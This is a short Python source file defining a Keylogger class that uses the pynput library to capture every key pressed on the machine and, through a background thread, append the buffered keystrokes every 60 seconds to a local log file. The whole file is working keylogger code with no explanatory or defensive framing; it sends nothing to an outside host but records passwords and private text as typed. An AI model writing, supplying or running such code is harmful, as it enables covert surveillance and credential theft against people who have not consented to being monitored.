from pynput import keyboard
import time
import threading
from pathlib import Path

class Keylogger:
    def __init__(self, interval=60):
        self.interval = interval
        self.log = ""
        self.running = False
        self.log_file = Path('data/logs/keystrokes.log')
        self.log_file.parent.mkdir(parents=True, exist_ok=True)

    def _on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f"[{key}]"

    def _report(self):
        """Save logs periodically"""
        while self.running:
            time.sleep(self.interval)
            if self.log:
                with self.log_file.open('a') as f:
                    f.write(self.log)
                self.log = ""

    def start(self):
        """Start keylogger"""
        self.running = True
        # Start reporting thread
        threading.Thread(target=self._report).start()
        # Start listener
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()